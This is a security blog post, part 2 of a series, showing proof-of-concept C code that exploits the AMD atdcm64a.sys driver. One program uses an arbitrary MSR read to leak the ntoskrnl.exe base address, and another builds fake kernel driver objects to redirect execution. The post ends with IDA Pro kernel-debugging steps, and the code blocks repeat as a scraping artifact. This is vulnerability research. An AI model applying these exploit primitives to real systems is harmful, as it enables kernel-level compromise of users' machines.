# https://security.humanativaspa.it/exploiting-amd-atdcm64a-sys-arbitrary-pointer-dereference-part-2/

[Skip to main content](https://hnsecurity.it/blog/exploiting-amd-atdcm64a-sys-arbitrary-pointer-dereference-part-2/#sections-container)

![](https://hnsecurity.it/wp-content/uploads/2025/09/AMD-uai-836x836.jpg)

# Exploiting AMD atdcm64a.sys arbitrary pointer dereference – Part 2

October 2, 2024\|[![Alessandro Iandoli](https://secure.gravatar.com/avatar/644822f5d8329ca419a50c1f39c97de5ccd163d1932e4cdc60a6cc8cb64ed29e?s=40&d=mm&r=g)](https://hnsecurity.it/blog/author/ale98/) By [Alessandro Iandoli](https://hnsecurity.it/blog/author/ale98/)

[Exploits](https://hnsecurity.it/blog/category/exploits/ "View all posts in Exploits"), [Vulnerabilities](https://hnsecurity.it/blog/category/vulnerabilities/ "View all posts in Vulnerabilities")

Welcome back! We concluded the [previous article](https://hnsecurity.it/blog/exploiting-amd-atdcm64a-sys-arbitrary-pointer-dereference-part-1/) by spotting two vulnerabilities in _atdcm64a.sys_: an **arbitrary MSR read** and an **arbitrary pointer dereference**. In this second part of the [series](https://hnsecurity.it/tag/atdcm64a/) we will focus on confirming that we can actually exploit these vulnerabilities.

We will start with the **arbitrary MSR read**, by creating a PoC that exploits the vulnerability by reading a **Model Specific Register (MSR)** of our choice and finally retrieves the **base address of ntoskrnl.exe**.

Then we will focus on the **arbitrary pointer dereference**. In this case the objective of the PoC will be to **redirect the execution flow to an arbitrary location** leading the VM to crash by causing a _BSOD_. We will have to define multiple data structures in order to successfully hijack the execution flow and debug the driver. We will see how to **debug the driver using IDA Pro with the assistance of the decompiled code**.

## Confirming the vulnerabilities

At this point the objective is confirming that we are actually able to exploit the vulnerabilities by creating a simple C/C++ program that interacts with the driver and sends the appropriate IOCTLs.

### Confirming the arbitrary MSR read

Let’s start confirming the arbitrary MSR read vulnerability as it seems much easier to exploit. Here’s a snippet of code that allows us to confirm the vulnerability:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

\[...\]

DWORD64 g\_ntbase = 0;

DWORD64 g\_kisystemcall64shadow = 0;

\[...\]

#define SIZE\_BUF 4096

#define IOCTL\_READMSR 0x22e09c

#define IOCTL\_ARBITRARYCALLDRIVER 0x22e04c

#define IA32\_GS\_BASE 0xc0000101

#define IA32\_LSTAR 0xc0000082

#define IA32\_STAR 0xc0000081

HANDLE g\_device;

BOOL readMSR(DWORD msr\_value,PVOID outputBuffer, SIZE\_T outSize){

char\\* inputBuffer = (char\*)VirtualAlloc(

NULL,

SIZE\_BUF,

MEM\_COMMIT \| MEM\_RESERVE,

PAGE\_EXECUTE\_READWRITE);

\*((DWORD\*)inputBuffer) = msr\_value;

if(inputBuffer == NULL)

return -2;

printf("\[+\] User buffer allocated: 0x%8p\\n", inputBuffer);

DWORD bytesRet = 0;

BOOL res = DeviceIoControl(

g\_device,

IOCTL\_READMSR,

inputBuffer,

SIZE\_BUF,

outputBuffer,

outSize,

&bytesRet,

NULL

);

printf("\[\*\] sent IOCTL\_READMSR \\n");

if(!res){

printf("\[-\] DeviceIoControl failed with error: %d\\n", GetLastError());

}

return res;

}

intmain()

{

DWORD bytesRet = 0;

g\_device = CreateFileA(

"\\\\\\.\\\AtiDCM",

GENERIC\_READ \| GENERIC\_WRITE,

0,

NULL,

OPEN\_EXISTING,

FILE\_ATTRIBUTE\_NORMAL \| FILE\_FLAG\_OVERLAPPED,

NULL);

if(g\_device == INVALID\_HANDLE\_VALUE)

{

printf("\[-\] Failed to open handle to device.");

return -1;

}

printf("\[+\] Opened handle to device: 0x%8p\\n", g\_device);

char\\* outputBuffer = (char\*)VirtualAlloc(

NULL,

SIZE\_BUF,

MEM\_COMMIT \| MEM\_RESERVE,

PAGE\_EXECUTE\_READWRITE);

memset(outputBuffer, 0x0, SIZE\_BUF);

if(readMSR(IA32\_LSTAR, outputBuffer, SIZE\_BUF)){

printf("\[+\] readMSR success.\\n");

printf("\[+\] IA32\_LSTAR = 0x%8p\\n", \*((DWORD64\*)(outputBuffer + 12)));

//printf("\[+\] IA32\_LSTAR = 0x%8p\\n", \*((DWORD64\*)(outputBuffer + 4)));

g\_kisystemcall64shadow = \*((DWORD64\*)(outputBuffer + 12));

g\_ntbase = (DWORD64)g\_kisystemcall64shadow - 0xaf61c0;

printf("\[+\] g\_ntbase = 0x%p\\n", g\_ntbase);

}

return 0;

}

\[...\]

DWORD64 g\_ntbase = 0;
DWORD64 g\_kisystemcall64shadow = 0;
\[...\]
#define SIZE\_BUF 4096
#define IOCTL\_READMSR 0x22e09c
#define IOCTL\_ARBITRARYCALLDRIVER 0x22e04c
#define IA32\_GS\_BASE 0xc0000101
#define IA32\_LSTAR 0xc0000082
#define IA32\_STAR 0xc0000081

HANDLE g\_device;

BOOL readMSR(DWORD msr\_value,PVOID outputBuffer, SIZE\_T outSize) {
char\* inputBuffer = (char\*)VirtualAlloc(
NULL,
SIZE\_BUF,
MEM\_COMMIT \| MEM\_RESERVE,
PAGE\_EXECUTE\_READWRITE);

\*((DWORD\*)inputBuffer) = msr\_value;

if (inputBuffer == NULL)
return -2;

printf("\[+\] User buffer allocated: 0x%8p\\n", inputBuffer);


DWORD bytesRet = 0;


BOOL res = DeviceIoControl(
g\_device,
IOCTL\_READMSR,
inputBuffer,
SIZE\_BUF,
outputBuffer,
outSize,
&bytesRet,
NULL
);

printf("\[\*\] sent IOCTL\_READMSR \\n");
if (!res) {
printf("\[-\] DeviceIoControl failed with error: %d\\n", GetLastError());
}
return res;
}

int main()
{
DWORD bytesRet = 0;

g\_device = CreateFileA(
"\\\\\\.\\\AtiDCM",
GENERIC\_READ \| GENERIC\_WRITE,
0,
NULL,
OPEN\_EXISTING,
FILE\_ATTRIBUTE\_NORMAL \| FILE\_FLAG\_OVERLAPPED,
NULL);

if (g\_device == INVALID\_HANDLE\_VALUE)
{
printf("\[-\] Failed to open handle to device.");
return -1;
}

printf("\[+\] Opened handle to device: 0x%8p\\n", g\_device);

char\* outputBuffer = (char\*)VirtualAlloc(
NULL,
SIZE\_BUF,
MEM\_COMMIT \| MEM\_RESERVE,
PAGE\_EXECUTE\_READWRITE);

memset(outputBuffer, 0x0, SIZE\_BUF);

if (readMSR(IA32\_LSTAR, outputBuffer, SIZE\_BUF)) {
printf("\[+\] readMSR success.\\n");
printf("\[+\] IA32\_LSTAR = 0x%8p\\n", \*((DWORD64\*)(outputBuffer + 12)));
//printf("\[+\] IA32\_LSTAR = 0x%8p\\n", \*((DWORD64\*)(outputBuffer + 4)));
g\_kisystemcall64shadow = \*((DWORD64\*)(outputBuffer + 12));
g\_ntbase = (DWORD64)g\_kisystemcall64shadow - 0xaf61c0;
printf("\[+\] g\_ntbase = 0x%p\\n", g\_ntbase);
}

return 0;
}

```
[...]

DWORD64 g_ntbase = 0;
DWORD64 g_kisystemcall64shadow = 0;
[...]
#define SIZE_BUF 4096
#define IOCTL_READMSR 0x22e09c
#define IOCTL_ARBITRARYCALLDRIVER    0x22e04c
#define IA32_GS_BASE 0xc0000101
#define IA32_LSTAR	0xc0000082
#define IA32_STAR	0xc0000081

HANDLE g_device;

BOOL readMSR(DWORD msr_value,PVOID outputBuffer, SIZE_T outSize) {
    char* inputBuffer = (char*)VirtualAlloc(
        NULL,
        SIZE_BUF,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    *((DWORD*)inputBuffer) = msr_value;

    if (inputBuffer == NULL)
        return -2;

    printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);


    DWORD bytesRet = 0;


    BOOL res = DeviceIoControl(
        g_device,
        IOCTL_READMSR,
        inputBuffer,
        SIZE_BUF,
        outputBuffer,
        outSize,
        &bytesRet,
        NULL
    );

    printf("[*] sent IOCTL_READMSR \n");
    if (!res) {
        printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
    }
    return res;
}

int main()
{
    DWORD bytesRet = 0;

    g_device = CreateFileA(
        "\\\\.\\AtiDCM",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL);

    if (g_device == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open handle to device.");
        return -1;
    }

    printf("[+] Opened handle to device: 0x%8p\n", g_device);

    char* outputBuffer = (char*)VirtualAlloc(
        NULL,
        SIZE_BUF,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memset(outputBuffer, 0x0, SIZE_BUF);

    if (readMSR(IA32_LSTAR, outputBuffer, SIZE_BUF)) {
        printf("[+] readMSR success.\n");
        printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 12)));
        //printf("[+] IA32_LSTAR = 0x%8p\n", *((DWORD64*)(outputBuffer + 4)));
        g_kisystemcall64shadow = *((DWORD64*)(outputBuffer + 12));
        g_ntbase = (DWORD64)g_kisystemcall64shadow - 0xaf61c0;
        printf("[+] g_ntbase = 0x%p\n", g_ntbase);
    }

    return 0;
}
```

The PoC simply does the following:

1. Open the handle to device using the name
\\\.\\AtiDCM
`\\.\AtiDCM`.
2. Issue a call to **_DeviceIoControl()_** passing as input: the _handle_ obtained previously, the **IOCTL 0x22e09c**, that allows to reach the vulnerability, the _inputBuffer_, that contains the value of the **MSR that we want to read** (in this case is 0xc0000082 that corresponds to the **IA32\_LSTAR MSR**) and the _outputBuffer_.
3. Read the value of the **IA32\_LSTAR** register from the outputBuffer (it contains the address of
nt!KiSystemCall64Shadow
`nt!KiSystemCall64Shadow`) and then **subtract offset 0xaf61c0** in order to retrieve the **base address of ntoskrnl.exe**.

After compiling and running our PoC we get the following output.

![](https://hnsecurity.it/wp-content/uploads/2024/08/image-28-1.png)Leaking the base of ntoskrnl.exe running the PoC

We can confirm in Windbg that the base address of ntoskrnl.exe calculated in the PoC is valid.

![](https://hnsecurity.it/wp-content/uploads/2024/08/image-29-1.png)Printing the base address of ntoskrnl.exe in windbg

### Confirming the arbitrary pointer dereference

In order to confirm the second vulnerability we need to:

- Issue another _DeviceIoControl()_ passing as input: the _IOCTL_ that allows to reach the vulnerability and an **_inputBuffer_**.
- Create multiple data structures in memory to craft an _**inputBuffer**_ that allows us to reach the **call to arbitrary function pointer** in the _**IofCallDriver()**_ procedure.
- Debug the driver.

Below I try to summarize what calls are performed by the driver in the execution flow that lead to a **call to arbitrary function pointer**:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

callDriver(\*(systemBuffer+1),.....)

│

├>AttachedDevice = IoGetAttachedDeviceReference(\*(systemBuffer+1))

├>IofCallDriver(AttachedDevice,...)

│

├>AttachedDevice->DriverObject->MajorFunction\[IRP\_MJ\_XXX\](AttachedDevice,...)

callDriver(\*(systemBuffer+1),.....)
│
├>AttachedDevice = IoGetAttachedDeviceReference(\*(systemBuffer+1))
├>IofCallDriver(AttachedDevice,...)
│
├>AttachedDevice->DriverObject->MajorFunction\[IRP\_MJ\_XXX\](AttachedDevice,...)

```
callDriver(*(systemBuffer+1),.....)
│
├>AttachedDevice = IoGetAttachedDeviceReference(*(systemBuffer+1))
├>IofCallDriver(AttachedDevice,...)
  │
  ├>AttachedDevice->DriverObject->MajorFunction[IRP_MJ_XXX](AttachedDevice,...)
```

This means that we must:

- Allocate a **first** object named
object
`object` that contains our **first fake** **\_DEVICE\_OBJECT** named
DeviceObject
`DeviceObject`, prepended by an **\_OBJECT\_HEADER**. Recall that we have to pass the increment performed by _**ObpIncrPointerCount()**_, in _**IoGetAttachedDeviceReference()**_. Failing to allocate space also for the \_OBJECT\_HEADER will trigger a **BSOD**.
- Allocate a **second** object named
object2
`object2` that contains our **second fake** **\_DEVICE\_OBJECT** named
DeviceObject2
`DeviceObject2` prepended by another **\_OBJECT\_HEADER**.
- Set
DeviceObject->AttachedDevice = DeviceObject2
`DeviceObject->AttachedDevice = DeviceObject2`. This way **_IoGetAttachedDeviceReference()_ will return a pointer to DeviceObject2**.
- Create a \_DRIVER\_OBJECT named
DriverObject
`DriverObject` containing the **function pointer** defined by us.
- Set
DeviceObject2->DriverObject = DriverObject
`DeviceObject2->DriverObject = DriverObject`. This way _**IofCallDriver()**_ **will dereference our**
**DriverObject**
**`DriverObject` and call our arbitrary function pointer**.

Here’s a visualization of the objects we would like to create in memory:

![](https://hnsecurity.it/wp-content/uploads/2024/08/image-32-1.png)

Below you can find the updated code. In this case it just sets the arbitrary function pointer to be _0xdeadbeef_.

_The actual code contains a bunch of other definitions such as [DEVICE\_OBJECT](https://www.vergiliusproject.com/kernels/x64/windows-11/22h2/_DEVICE_OBJECT) and [DRIVER\_OBJECT](https://www.vergiliusproject.com/kernels/x64/windows-11/22h2/_DRIVER_OBJECT) that I skipped for clarity in the code block below. However, you can very likely find all the required definitions in [vergilius project](https://www.vergiliusproject.com/kernels/x64/windows-11/22h2) or directly in the [header files](https://github.com/tpn/winsdk-10/tree/master/Include)._

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

\[...\]

typedefstructDECLSPEC\_ALIGN(MEMORY\_ALLOCATION\_ALIGNMENT) \_DEVICE\_OBJECT {

CSHORT Type;

USHORT Size;

LONG ReferenceCount;

struct \_DRIVER\_OBJECT\* DriverObject;

struct \_DEVICE\_OBJECT\* NextDevice;

struct \_DEVICE\_OBJECT\* AttachedDevice;

\[...\]

DWORD64 g\_ntbase = 0;

DWORD64 g\_kisystemcall64shadow = 0;

\[...\]

#define SIZE\_BUF 4096

#define IOCTL\_READMSR 0x22e09c

#define IOCTL\_ARBITRARYCALLDRIVER 0x22e04c

#define IA32\_GS\_BASE 0xc0000101

#define IA32\_LSTAR 0xc0000082

#define IA32\_STAR 0xc0000081

HANDLE g\_device;

BOOL readMSR(DWORD msr\_value,PVOID outputBuffer, SIZE\_T outSize){

\[...\]

}

BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE\_T outSize){

char\\* inputBuffer = (char\*)VirtualAlloc(

NULL,

21,

MEM\_COMMIT \| MEM\_RESERVE,

PAGE\_EXECUTE\_READWRITE);

char\\* object = (char\*)VirtualAlloc(

NULL,

SIZE\_BUF,

MEM\_COMMIT \| MEM\_RESERVE,

PAGE\_EXECUTE\_READWRITE);

printf("\[+\] object = 0x%p\\n", object);

PDEVICE\_OBJECT ptr = (PDEVICE\_OBJECT)(object + 0x30);

memset(object, 0x41, 0x30);

printf("\[+\] ptr = 0x%p\\n", ptr);

char\\* object2 = (char\*)VirtualAlloc(

NULL,

SIZE\_BUF,

MEM\_COMMIT \| MEM\_RESERVE,

PAGE\_EXECUTE\_READWRITE);

printf("\[+\] object2 = 0x%p\\n", object2);

memset(object2, 0x43, 0x30);

char\\* driverObject = (char\*)VirtualAlloc(

NULL,

SIZE\_BUF,

MEM\_COMMIT \| MEM\_RESERVE,

PAGE\_EXECUTE\_READWRITE);

memset(driverObject, 0x50, SIZE\_BUF);

printf("\[+\] driverObject = 0x%p\\n", driverObject);

char\\* ptrDriver = driverObject + 0x30;

char\\* pDriverFunction = ptrDriver + 0x1b\*8+0x70;

\*((PDWORD64)pDriverFunction) = 0xdeadbeef;

ptr->AttachedDevice = (PDEVICE\_OBJECT)(object2 + 0x30);

memset(ptr->AttachedDevice, 0x42, SIZE\_BUF-0x40);

printf("\[+\] ptr->AttachedDevice = 0x%p\\n", ptr->AttachedDevice);

ptr->AttachedDevice->DriverObject = (\_DRIVER\_OBJECT\*)ptrDriver;

ptr->AttachedDevice->AttachedDevice = 0;

char\\* ptr2 = inputBuffer;

\*(ptr2) = 0;

ptr2 += 1;

\*((PDWORD64)ptr2) = (DWORD64)ptr;

printf("\[+\] User buffer allocated: 0x%8p\\n", inputBuffer);

DWORD bytesRet = 0;

getchar();

BOOL res = DeviceIoControl(

g\_device,

IOCTL\_ARBITRARYCALLDRIVER,

inputBuffer,

SIZE\_BUF,

outputBuffer,

outSize,

&bytesRet,

NULL

);

printf("\[\*\] sent IOCTL\_ARBITRARYCALLDRIVER \\n");

if(!res){

printf("\[-\] DeviceIoControl failed with error: %d\\n", GetLastError());

}

return res;

}

intmain()

{

DWORD bytesRet = 0;

g\_device = CreateFileA(

"\\\\\\.\\\AtiDCM",

GENERIC\_READ \| GENERIC\_WRITE,

0,

NULL,

OPEN\_EXISTING,

FILE\_ATTRIBUTE\_NORMAL \| FILE\_FLAG\_OVERLAPPED,

NULL);

\[...\]

if(readMSR(IA32\_LSTAR, outputBuffer, SIZE\_BUF)){

\[...\]

}

arbitraryCallDriver(outputBuffer, SIZE\_BUF);

return 0;

}

\[...\]

typedef struct DECLSPEC\_ALIGN(MEMORY\_ALLOCATION\_ALIGNMENT) \_DEVICE\_OBJECT {
CSHORT Type;
USHORT Size;
LONG ReferenceCount;
struct \_DRIVER\_OBJECT\* DriverObject;
struct \_DEVICE\_OBJECT\* NextDevice;
struct \_DEVICE\_OBJECT\* AttachedDevice;
\[...\]

DWORD64 g\_ntbase = 0;
DWORD64 g\_kisystemcall64shadow = 0;
\[...\]
#define SIZE\_BUF 4096
#define IOCTL\_READMSR 0x22e09c
#define IOCTL\_ARBITRARYCALLDRIVER 0x22e04c
#define IA32\_GS\_BASE 0xc0000101
#define IA32\_LSTAR 0xc0000082
#define IA32\_STAR 0xc0000081

HANDLE g\_device;

BOOL readMSR(DWORD msr\_value,PVOID outputBuffer, SIZE\_T outSize) {
\[...\]
}

BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE\_T outSize) {
char\* inputBuffer = (char\*)VirtualAlloc(
NULL,
21,
MEM\_COMMIT \| MEM\_RESERVE,
PAGE\_EXECUTE\_READWRITE);

char\* object = (char\*)VirtualAlloc(
NULL,
SIZE\_BUF,
MEM\_COMMIT \| MEM\_RESERVE,
PAGE\_EXECUTE\_READWRITE);
printf("\[+\] object = 0x%p\\n", object);

PDEVICE\_OBJECT ptr = (PDEVICE\_OBJECT)(object + 0x30);

memset(object, 0x41, 0x30);

printf("\[+\] ptr = 0x%p\\n", ptr);
char\* object2 = (char\*)VirtualAlloc(
NULL,
SIZE\_BUF,
MEM\_COMMIT \| MEM\_RESERVE,
PAGE\_EXECUTE\_READWRITE);

printf("\[+\] object2 = 0x%p\\n", object2);
memset(object2, 0x43, 0x30);

char\* driverObject = (char\*)VirtualAlloc(
NULL,
SIZE\_BUF,
MEM\_COMMIT \| MEM\_RESERVE,
PAGE\_EXECUTE\_READWRITE);

memset(driverObject, 0x50, SIZE\_BUF);
printf("\[+\] driverObject = 0x%p\\n", driverObject);
char\* ptrDriver = driverObject + 0x30;
char\* pDriverFunction = ptrDriver + 0x1b\*8+0x70;

\*((PDWORD64)pDriverFunction) = 0xdeadbeef;

ptr->AttachedDevice = (PDEVICE\_OBJECT)(object2 + 0x30);


memset(ptr->AttachedDevice, 0x42, SIZE\_BUF-0x40);

printf("\[+\] ptr->AttachedDevice = 0x%p\\n", ptr->AttachedDevice);


ptr->AttachedDevice->DriverObject = (\_DRIVER\_OBJECT\*)ptrDriver;
ptr->AttachedDevice->AttachedDevice = 0;
char\* ptr2 = inputBuffer;
\*(ptr2) = 0;
ptr2 += 1;
\*((PDWORD64)ptr2) = (DWORD64)ptr;


printf("\[+\] User buffer allocated: 0x%8p\\n", inputBuffer);

DWORD bytesRet = 0;

getchar();

BOOL res = DeviceIoControl(
g\_device,
IOCTL\_ARBITRARYCALLDRIVER,
inputBuffer,
SIZE\_BUF,
outputBuffer,
outSize,
&bytesRet,
NULL
);

printf("\[\*\] sent IOCTL\_ARBITRARYCALLDRIVER \\n");
if (!res) {
printf("\[-\] DeviceIoControl failed with error: %d\\n", GetLastError());
}
return res;
}

int main()
{
DWORD bytesRet = 0;

g\_device = CreateFileA(
"\\\\\\.\\\AtiDCM",
GENERIC\_READ \| GENERIC\_WRITE,
0,
NULL,
OPEN\_EXISTING,
FILE\_ATTRIBUTE\_NORMAL \| FILE\_FLAG\_OVERLAPPED,
NULL);

\[...\]

if (readMSR(IA32\_LSTAR, outputBuffer, SIZE\_BUF)) {
\[...\]
}

arbitraryCallDriver(outputBuffer, SIZE\_BUF);
return 0;
}

```
[...]

typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT) _DEVICE_OBJECT {
    CSHORT Type;
    USHORT Size;
    LONG ReferenceCount;
    struct _DRIVER_OBJECT* DriverObject;
    struct _DEVICE_OBJECT* NextDevice;
    struct _DEVICE_OBJECT* AttachedDevice;
[...]

DWORD64 g_ntbase = 0;
DWORD64 g_kisystemcall64shadow = 0;
[...]
#define SIZE_BUF 4096
#define IOCTL_READMSR 0x22e09c
#define IOCTL_ARBITRARYCALLDRIVER    0x22e04c
#define IA32_GS_BASE 0xc0000101
#define IA32_LSTAR	0xc0000082
#define IA32_STAR	0xc0000081

HANDLE g_device;

BOOL readMSR(DWORD msr_value,PVOID outputBuffer, SIZE_T outSize) {
    [...]
}

BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
    char* inputBuffer = (char*)VirtualAlloc(
        NULL,
        21,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    char* object = (char*)VirtualAlloc(
        NULL,
        SIZE_BUF,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    printf("[+] object = 0x%p\n", object);

    PDEVICE_OBJECT ptr = (PDEVICE_OBJECT)(object + 0x30);

    memset(object, 0x41, 0x30);

    printf("[+] ptr = 0x%p\n", ptr);
    char* object2 = (char*)VirtualAlloc(
        NULL,
        SIZE_BUF,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    printf("[+] object2 = 0x%p\n", object2);
    memset(object2, 0x43, 0x30);

    char* driverObject = (char*)VirtualAlloc(
        NULL,
        SIZE_BUF,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memset(driverObject, 0x50, SIZE_BUF);
    printf("[+] driverObject = 0x%p\n", driverObject);
    char* ptrDriver = driverObject + 0x30;
    char* pDriverFunction = ptrDriver + 0x1b*8+0x70;

    *((PDWORD64)pDriverFunction) = 0xdeadbeef;

    ptr->AttachedDevice = (PDEVICE_OBJECT)(object2 + 0x30);


    memset(ptr->AttachedDevice, 0x42, SIZE_BUF-0x40);

    printf("[+] ptr->AttachedDevice = 0x%p\n", ptr->AttachedDevice);


    ptr->AttachedDevice->DriverObject = (_DRIVER_OBJECT*)ptrDriver;
    ptr->AttachedDevice->AttachedDevice = 0;
    char* ptr2 = inputBuffer;
    *(ptr2) = 0;
    ptr2 += 1;
    *((PDWORD64)ptr2) = (DWORD64)ptr;


    printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);

    DWORD bytesRet = 0;

    getchar();

    BOOL res = DeviceIoControl(
        g_device,
        IOCTL_ARBITRARYCALLDRIVER,
        inputBuffer,
        SIZE_BUF,
        outputBuffer,
        outSize,
        &bytesRet,
        NULL
    );

    printf("[*] sent IOCTL_ARBITRARYCALLDRIVER \n");
    if (!res) {
        printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
    }
    return res;
}

int main()
{
    DWORD bytesRet = 0;

    g_device = CreateFileA(
        "\\\\.\\AtiDCM",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL);

  [...]

    if (readMSR(IA32_LSTAR, outputBuffer, SIZE_BUF)) {
        [...]
    }

  arbitraryCallDriver(outputBuffer, SIZE_BUF);
    return 0;
}
```

The _arbitraryCallDriver()_ is the function that triggers the vulnerability and performs the following:

1. Allocate the
inputBuffer
`inputBuffer` that will **contain the final buffer that will be sent to driver** through the DeviceIoControl WinAPI.
2. Allocate
object
`object`, set
ptr
`ptr` to point to
object+0x30
`object+0x30` (after the _\_OBJECT\_HEADER struct_) and fill the _\_OBJECT\_HEADER_ with the dummy value 0x41.
3. Allocate
object2
`object2` and fill its _\_OBJECT\_HEADER_ with the dummy value 0x43.
4. Allocate
DriverObject
`DriverObject`, fill it with the dummy value 0x50 and **set the target function pointer** that will be called by the driver to be **0xdeadbeef**. Notice how we calculate the offset from
DriverObject
`DriverObject` to the target function pointer. First we set
ptrDriver
`ptrDriver` to point to
DriverObject+0x30
`DriverObject+0x30` in order to skip the _\_OBJECT\_HEADER_. Then from
ptrDriver
`ptrDriver` we **sum 0x70** (if you take the definition of [\_DRIVER\_OBJECT](https://www.vergiliusproject.com/kernels/x64/windows-11/22h2/_DRIVER_OBJECT) the **start of the MajorFunction array is at 0x70**) and then we sum **0x1b\*8**. 8 because the **size of a function pointer is 8 bytes in a x64 architecture**. 0x1b because in the reversed _callDriver()_ function the call to _**IoBuildSynchronousFsdRequest()**_ is passing as first parameter **IRP\_MJ\_PNP**. If we give a look at the definition of **IRP\_MJ\_PNP** inside [wdm.h](https://github.com/tpn/winsdk-10/blob/master/Include/10.0.14393.0/km/wdm.h#L26620), its value **corresponds to 0x1b**.
5. After that we set that the
AttachedDevice
`AttachedDevice` field of
object
`object` points to the
DeviceObject
`DeviceObject` inside
object2
`object2` at
object2+x030
`object2+x030`. The
AttachedDevice
`AttachedDevice` field of
object
`object` can be now referenced also with
ptr->AttachedDevice
`ptr->AttachedDevice`.
6. Finally we set
ptr->AttachedDevice->DriverObject
`ptr->AttachedDevice->DriverObject` to point to
ptrDriver
`ptrDriver` (that contains our rogue _\_DRIVER\_OBJECT_ with the function pointer that points to **0xdeadbeef**) and
ptr->AttachedDevice->DeviceObject
`ptr->AttachedDevice->DeviceObject` to **NULL** so that we can **exit successfully from the for loop** inside _IoGetAttachedDeviceReference()_.
7. We populate our
inputBuffer
`inputBuffer` with the **first byte equal to 0** and the **subsequent 8 bytes containing the pointer to**
**ptr**
**`ptr`**(that is
object+0x30
`object+0x30`). We must set the first byte equal to 0, because if you re-inspect the figure below you may notice the
if(\*(\_BYTE\*)systemBuffer\_12)
`if(*(_BYTE*)systemBuffer_12)` that may lead to a
goto completeRequest2
`goto completeRequest2`, where the
completeRequest2
`completeRequest2` label references a code location that **exits from the function** and **won’t allow us to enter the vulnerable path**. So by just **setting the first byte of**
**systemBuffer\_12**
**`systemBuffer_12`** **to 0** we can just skip this condition and reach our vulnerable function.

![](https://hnsecurity.it/wp-content/uploads/2024/08/image-25-1.png)call to callDriver()

### Debugging with IDA Pro

Crafting the proper inputBuffer and data structures in order to reach a vulnerability is typically difficult to do at the first shot. It usually requires debugging and a fair amount of trial and error.

For this reason, I’m going to show how to **debug the driver with the assistance of IDA Pro Debugger**. This proves to be particularly useful especially when you want to **debug a routine and understand its behavior with the assistance of the pseudocode provided by IDA Pro**.

You can setup the **IDA Pro Debugger** to do kernel debugging as follows:

1. Press
f9
`f9` or click
Debugger > Select debugger...
`Debugger > Select debugger...`.
2. Select the option
Windbg debugger
`Windbg debugger`.
3. Click
Debugger > process options...
`Debugger > process options...`.
4. In the connection string enter
net:port=<port>,key=<a.b.c.d>
`net:port=<port>,key=<a.b.c.d>` you can get the port and key values by typing
bcdedit /dbgsettings
`bcdedit /dbgsettings` (run it as administrator) in your Windows VM.
5. Click
Debugger Debugger specific options
`Debugger Debugger specific options` and set **Kernel mode debugging** and click
Ok
`Ok`.
6. Click
Debugger Options
`Debugger Options` and check **Autoload PDB files**.

You can now press the **green play button** on top and you will notice it will start **loading PDB symbols** for all the drivers loaded in the Windows VM.

_We are actually just interested in loading symbols just for ntoskrnl.exe but I couldn’t find a way to specify it._

![](https://hnsecurity.it/wp-content/uploads/2024/08/image-34-1.png)IDA Pro loading PDB symbols

At this point we are able to **set breakpoints inside our vulnerable driver and debug it with the assistance of the pseudocode** but we are **not able to do the same with the ntoskrnl.exe** module.

In particular, **we would like to debug, assisted by the pseudocode, the functions called by _callDriver()_** such as _IoGetAttachedDeviceReference()_, _IoBuildSynchronousFsdRequest()_ and _IofCallDriver()_.

We can achieve this as follows:

1. Click
View > Open subviews > Segments
`View > Open subviews > Segments` and right click on the **nt** module and select
Edit segment
`Edit segment`.


![](https://hnsecurity.it/wp-content/uploads/2024/08/image-36-1.png)Modify nt segment – Step 1
2. **Uncheck Debugger segment** and **check Loader segment**(see [here](https://hex-rays.com/blog/several-files-in-one-idb-part-3) for further details). Press Ok.


![](https://hnsecurity.it/wp-content/uploads/2024/08/image-37-1.png)Modify nt segment – Step 2

You will see that IDA Pro starts performing the conversion:

![](https://hnsecurity.it/wp-content/uploads/2024/08/image-38-1.png)IDA Pro popup converting debug to loader segment

Once it finishes, stop debugging by clicking the **red stop button** on the top. You can see IDA Pro deletes the debug segments but keeps the loader segments:

![](https://hnsecurity.it/wp-content/uploads/2024/08/image-39-1.png)IDA Pro deleting debug segment

Once it finishes, we can see in the Functions tab a bunch of **nt\_xxx** functions. These are the functions of the **nt** (ntoskrnl.exe) module that is now a **loader segment**. Wait for IDA Pro to analyze it:

![](https://hnsecurity.it/wp-content/uploads/2024/08/image-40-1.png)Ntoskrnl.exe functions are now available

_If you didn’t take a snpashot you will have to repeat the process everytime since IDA Pro will create another debugger nt segment at a different base address. With the snapshot, the base of your loader nt segment will always match with that of the debugger._

At this point we can select for example function _nt\_IoGetAttachedDeviceReference_ and we have the decompiled code (we will have to reverse again the functions by re-applying the proper function signatures and redefining the correct types for variables):

![](https://hnsecurity.it/wp-content/uploads/2024/08/image-41-1.png)Decompiled view of IoGetAttachedDeviceReference()

So now we can restart debugging the VM (I suggest you to **uncheck** the **Autoload PDB files** under

Debugger Options

`Debugger Options` in order to speed up the loading process). Let’s start placing a **breakpoint** at the beginning of the vulnerable path inside _**InnerIrpDeviceIoCtlHandler()**_:

